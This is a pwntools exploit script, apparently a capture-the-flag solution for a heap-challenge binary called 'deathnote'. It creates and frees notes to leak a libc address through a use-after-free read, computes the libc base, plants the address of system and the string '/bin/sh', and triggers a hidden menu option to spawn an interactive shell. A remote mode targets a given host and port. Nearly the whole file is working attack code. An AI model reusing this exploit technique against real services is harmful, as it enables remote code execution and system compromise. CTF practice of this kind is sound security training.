from pwn import *
import sys
import random

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./deathnote"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    break _
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./glibc/libc.so.6"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def create(page, content):
    pp.recvuntil(b"-_|")
    pp.sendline(b"1")
    pp.recvuntil(b"request?\n\n")
    pp.sendline(str(len(content)+2).encode());
    pp.recvuntil(b"age?\n\n")
    pp.sendline(str(page).encode())
    pp.recvuntil(b"im:\n\n")
    pp.sendline(content)

def show(page, leak):
    pp.recvuntil(b"-_|")
    pp.sendline(b"3")
    pp.recvuntil(b"age?\n\n")
    pp.sendline(str(page).encode())
    pp.recvuntil(b":")
    try :
        if (leak == True):
            leakx = pp.recvline().rstrip().replace(b" ", b"")
            leakx += b"\x00" * (8 - len(leakx))
            return (u64(leakx))
    except:
        return pp.recvline().rstrip().replace(b" ", b"").decode()
    return pp.recvline().rstrip().replace(b" ", b"").decode()

def delete(page):
    pp.recvuntil(b"-_|")
    pp.sendline(b"2")
    pp.recvuntil(b"age?\n\n")
    pp.sendline(str(page).encode())


def exploit():
    for i in range(8):
        create(i, cyclic(126))

    create(8, cyclic(126))
    for i in range(7):
        delete(i)

    delete(7)
    log.info(f"real leak {hex(show(7, True))}")

    libc.address = show(7, True)-2206944
    log.info(f"real leak {hex(show(7, True))}")
    log.info(hex(libc.address))
    create(0, str(hex(libc.sym.system)).encode())
    create(1, b"/bin/sh\x00")
    pp.sendline(b"42")

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./glibc/libc.so.6")
else:
    libc = ELF("./glibc/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
